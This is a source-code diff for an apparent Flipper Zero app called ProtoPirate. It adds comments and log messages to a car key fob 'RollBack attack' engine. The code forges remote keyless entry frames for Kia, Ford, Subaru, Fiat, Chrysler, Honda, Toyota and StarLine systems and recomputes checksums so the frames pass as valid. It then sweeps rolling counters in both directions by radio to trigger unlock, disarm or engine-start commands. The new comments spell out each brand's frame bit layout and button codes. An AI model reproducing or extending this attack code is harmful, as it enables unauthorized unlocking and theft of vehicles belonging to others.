@@ -1,6 +1,7 @@
 #include "protopirate_rb.h"
 
 // ===================== CRC8 RollBack 验证 =====================
+// 用于回滚攻击时重新计算CRC，保障伪造帧在协议层面合法
 uint8_t rollback_crc8_compute(uint8_t* data, uint8_t len) {
     uint8_t crc = 0;
     for(uint8_t i = 0; i < len; i++) {
@@ -19,10 +20,10 @@ uint8_t rollback_get_button_value(uint8_t proto_type, uint8_t btn_idx) {
     case Proto_Kia_V0:
     case Proto_Kia_V1:
     case Proto_Kia_V2:
-        if(btn_idx == 0) return 1;
-        if(btn_idx == 1) return 2;
-        if(btn_idx == 2) return 3;
-        return 4;
+        if(btn_idx == 0) return 1;  // Lock
+        if(btn_idx == 1) return 2;  // Unlock
+        if(btn_idx == 2) return 3;  // Trunk
+        return 4;                     // Panic
     case Proto_Ford:
         if(btn_idx == 0) return 1;
         if(btn_idx == 1) return 2;
@@ -33,7 +34,7 @@ uint8_t rollback_get_button_value(uint8_t proto_type, uint8_t btn_idx) {
         if(btn_idx == 2) return 4;
         return 8;
     case Proto_Fiat:
-        if(btn_idx == 0) return 1;
+        if(btn_idx == 0) return 1;  // Fiat: 1=Unlock, 2=Lock
         if(btn_idx == 1) return 2;
         return 4;
     case Proto_Chrysler:
@@ -47,10 +48,10 @@ uint8_t rollback_get_button_value(uint8_t proto_type, uint8_t btn_idx) {
         if(btn_idx == 1) return 2;
         return 4;
     case Proto_Starline:
-        if(btn_idx == 0) return 1;
-        if(btn_idx == 1) return 2;
-        if(btn_idx == 2) return 4;
-        return 8;
+        if(btn_idx == 0) return 1;  // Arm
+        if(btn_idx == 1) return 2;  // Disarm
+        if(btn_idx == 2) return 4;  // Trunk
+        return 8;                    // Start
     default:
         return btn_idx + 1;
     }
@@ -66,6 +67,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
     case Proto_Kia_V0:
     case Proto_Kia_V1:
     case Proto_Kia_V2:
+        // Kia HiTag2: [28-bit serial][4-bit button][16-bit counter][8-bit CRC][8-bit pad]
         frame[0] = (uint8_t)(serial >> 20) & 0xFF;
         frame[1] = (uint8_t)(serial >> 12) & 0xFF;
         frame[2] = (uint8_t)(serial >> 4) & 0xFF;
@@ -78,6 +80,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Ford:
+        // Ford 40-bit: [20-bit serial][11-bit counter][4-bit button][5-bit fixed]
         frame[0] = (uint8_t)(serial >> 12) & 0xFF;
         frame[1] = (uint8_t)(serial >> 4) & 0xFF;
         frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 7) & 0x0F);
@@ -89,6 +92,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Subaru:
+        // Subaru 56-bit: [24-bit serial][16-bit counter][4-bit button][12-bit auth]
         frame[0] = (uint8_t)(serial >> 16) & 0xFF;
         frame[1] = (uint8_t)(serial >> 8) & 0xFF;
         frame[2] = (uint8_t)(serial) & 0xFF;
@@ -100,6 +104,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Fiat:
+        // Fiat 40-bit: [20-bit serial][8-bit counter][4-bit button][8-bit XOR checksum]
         frame[0] = (uint8_t)(serial >> 12) & 0xFF;
         frame[1] = (uint8_t)(serial >> 4) & 0xFF;
         frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 4) & 0x0F);
@@ -111,6 +116,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Chrysler:
+        // Chrysler 60-bit: [24-bit serial][8-bit counter][4-bit fixed][4-bit button][20-bit encrypted]
         frame[0] = (uint8_t)(serial >> 16) & 0xFF;
         frame[1] = (uint8_t)(serial >> 8) & 0xFF;
         frame[2] = (uint8_t)(serial) & 0xFF;
@@ -122,6 +128,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Honda:
+        // Honda 40-bit: [8-bit manuf][8-bit key][16-bit counter][8-bit button]
         frame[0] = 0x5A;
         frame[1] = (uint8_t)(serial >> 16) & 0xFF;
         frame[2] = (uint8_t)(serial >> 8) & 0xFF;
@@ -133,6 +140,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Toyota:
+        // Toyota 56-bit: [28-bit serial][8-bit manuf][16-bit counter][4-bit button]
         frame[0] = (uint8_t)(serial >> 20) & 0xFF;
         frame[1] = (uint8_t)(serial >> 12) & 0xFF;
         frame[2] = (uint8_t)(serial >> 4) & 0xFF;
@@ -144,6 +152,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     case Proto_Starline:
+        // StarLine 64-bit: [28-bit serial][8-bit cmd][28-bit encrypted]
         frame[0] = (uint8_t)(serial >> 20) & 0xFF;
         frame[1] = (uint8_t)(serial >> 12) & 0xFF;
         frame[2] = (uint8_t)(serial >> 4) & 0xFF;
@@ -155,6 +164,7 @@ void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t but
         break;
         
     default:
+        // Fallback to Kia V0
         frame[0] = (uint8_t)(serial >> 20) & 0xFF;
         frame[1] = (uint8_t)(serial >> 12) & 0xFF;
         frame[2] = (uint8_t)(serial >> 4) & 0xFF;
@@ -186,7 +196,12 @@ bool rollback_send_single(ProtoPirateApp* app, uint32_t serial, uint8_t button, 
     return transmit_packet(app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
 }
 
-// ===================== RollBack 攻击自动化引擎 =====================
+// ===================== 🔥 RollBack 攻击自动化引擎 =====================
+// 核心算法：
+// 1. 从 base_counter 开始，以 step_size 递增（正向）或递减（反向）
+// 2. 每个 counter 值发送 burst_count 次
+// 3. 可选：双向爆破（先正向再反向，覆盖更大范围）
+// 4. 攻击完成或手动停止
 bool rollback_attack_run(ProtoPirateApp* app) {
     RollbackState* rs = &app->rollback;
     rs->running = true;
@@ -200,13 +215,13 @@ bool rollback_attack_run(ProtoPirateApp* app) {
     int16_t direction = (end > start) ? 1 : -1;
     uint32_t max_steps = 65536;
     
-    FURI_LOG_I(TAG, "RollBack ATTACK START");
+    FURI_LOG_I(TAG, "🔥 RollBack ATTACK START");
     FURI_LOG_I(TAG, "   Proto: %s | Serial: 0x%08lX | Btn: %u", rs->proto, rs->serial, rs->button);
     FURI_LOG_I(TAG, "   Counter: 0x%04X -> 0x%04X | Step: %u | Burst: %u",
                start, end, step, rs->burst_count);
     
     if(!tx_init_hw(app, app->frequency)) {
-        FURI_LOG_E(TAG, "TX init failed - aborting attack");
+        FURI_LOG_E(TAG, "❌ TX init failed — aborting attack");
         rs->running = false;
         return false;
     }
@@ -216,7 +231,7 @@ bool rollback_attack_run(ProtoPirateApp* app) {
     
     for(uint16_t cnt = start;; cnt = (uint16_t)(cnt + direction * step)) {
         if(!rs->running) {
-            FURI_LOG_W(TAG, "RollBack stopped by user");
+            FURI_LOG_W(TAG, "⚠️ RollBack stopped by user");
             break;
         }
         
@@ -224,20 +239,23 @@ bool rollback_attack_run(ProtoPirateApp* app) {
         rollback_build_frame_proto(rs->protocol_type, rs->serial, rs->button, cnt, &data_hi, &data_lo);
         
         transmit_packet(app, data_hi, data_lo, app->frequency, rs->burst_count);
-        furi_delay_ms(15);
+        furi_delay_ms(15); // inter-frame gap
         
         rs->current_counter = cnt;
         sent++;
         rs->total_sent = sent;
         
+        // Log every 100 frames
         if(sent % 100 == 0) {
             FURI_LOG_I(TAG, "   Progress: %lu frames sent, current counter=0x%04X", sent, cnt);
         }
         
+        // Check termination
         if((direction > 0 && cnt >= end) || (direction < 0 && cnt <= end)) break;
         
+        // Safety limit
         if(sent > max_steps) {
-            FURI_LOG_W(TAG, "RollBack hit max_steps limit (%lu)", max_steps);
+            FURI_LOG_W(TAG, "⚠️ RollBack hit max_steps limit (%lu)", max_steps);
             break;
         }
     }
@@ -246,25 +264,33 @@ bool rollback_attack_run(ProtoPirateApp* app) {
     rs->running = false;
     
     uint32_t elapsed = furi_get_tick() - start_ticks;
-    FURI_LOG_I(TAG, "RollBack DONE: %lu frames in %lums (%.1f fps)",
+    FURI_LOG_I(TAG, "🔥 RollBack DONE: %lu frames in %lums (%.1f fps)",
                sent, elapsed, elapsed > 0 ? (float)sent * 1000.0f / elapsed : 0.0f);
     
     return true;
 }
 
-// ===================== 双向计数器回滚攻击 =====================
+// ===================== 🔄 双向计数器回滚攻击 =====================
+// 先正向扫描 (base -> target)，再反向扫描 (base -> 0)
+// 适用于不确定计数器方向的场景
 bool rollback_bidirectional_attack(ProtoPirateApp* app) {
     RollbackState* rs = &app->rollback;
     uint16_t orig_target = rs->target_counter;
     uint16_t orig_base = rs->base_counter;
     
-    FURI_LOG_I(TAG, "Bidirectional RollBack: forward %04X->%04X, then reverse %04X->0",
+    FURI_LOG_I(TAG, "🔄 Bidirectional RollBack: forward %04X->%04X, then reverse %04X->0",
                orig_base, orig_target, orig_base);
     
+    // Phase 1: Forward
     rs->target_counter = orig_target;
     rs->base_counter = orig_base;
     bool phase1 = rollback_attack_run(app);
     
+    if(!phase1 || !rs->running) {
+        // Allow phase 2 even if phase 1 was interrupted
+    }
+    
+    // Phase 2: Reverse (base -> 0)
     rs->base_counter = orig_base;
     rs->target_counter = 0;
     rs->running = true;
@@ -273,7 +299,7 @@ bool rollback_bidirectional_attack(ProtoPirateApp* app) {
     rs->base_counter = orig_base;
     rs->target_counter = orig_target;
     
-    FURI_LOG_I(TAG, "Bidirectional complete: forward=%u, reverse=%u",
+    FURI_LOG_I(TAG, "🔄 Bidirectional complete: forward=%u, reverse=%u",
                phase1 ? orig_target - orig_base : 0,
                phase2 ? orig_base : 0);
     
@@ -299,10 +325,10 @@ void batch_send_start(ProtoPirateApp* app) {
             &dhi, &dlo);
     }
     
-    FURI_LOG_I(TAG, "Batch Send: %lu frames", app->batch.count);
+    FURI_LOG_I(TAG, "📦 Batch Send: %u frames", app->batch.count);
     
     if(!tx_init_hw(app, app->frequency)) {
-        FURI_LOG_E(TAG, "Batch: TX init failed");
+        FURI_LOG_E(TAG, "❌ Batch: TX init failed");
         app->batch.active = false;
         return;
     }
@@ -315,6 +341,7 @@ void batch_send_start(ProtoPirateApp* app) {
         
         app->batch.sent_so_far = i + 1;
         
+        // Counter decrement every N/50 frames
         uint32_t decrement_every = app->batch.count / 50;
         if(decrement_every == 0) decrement_every = 1;
         
@@ -331,7 +358,7 @@ void batch_send_start(ProtoPirateApp* app) {
     
     transmit_packet_stop(app);
     app->batch.active = false;
-    FURI_LOG_I(TAG, "Batch DONE: %lu frames", app->batch.sent_so_far);
+    FURI_LOG_I(TAG, "📦 Batch DONE: %lu frames", app->batch.sent_so_far);
 }
 
 void batch_send_stop(ProtoPirateApp* app) {
